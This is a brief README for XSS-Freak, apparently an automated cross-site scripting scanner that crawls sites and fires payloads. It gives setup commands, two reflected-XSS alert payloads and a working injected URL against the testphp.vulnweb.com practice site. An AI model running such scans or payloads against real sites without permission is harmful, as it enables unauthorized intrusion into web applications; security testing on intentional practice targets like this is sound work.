# 🕷️ XSS-Freak — Updated README (2025)

XSS-Freak is a fast, multi-threaded Cross-Site Scripting scanner designed to crawl a target website, enumerate input points, and automatically launch XSS payloads — including **Payload Set 2**, a compact and high-confidence XSS payload pack.


```
git clone https://github.com/log0207/XSS-Freak
cd XSS-Freak

sudo apt install python3-venv -y

python3 -m venv venv
source venv/bin/activate

pip install -U -r requirements.txt

python3 XSS-Freak.py
```
payloads

```
<script>alert(1)</script>
><script>alert(1)</script>
```

target url 

```
http://testphp.vulnweb.com/listproducts.php?cat=1
```

xss url working : http://testphp.vulnweb.com/listproducts.php?cat=1><script>alert(1)</script>
```
http://testphp.vulnweb.com/listproducts.php?cat=1><script>alert(1)</script>
```
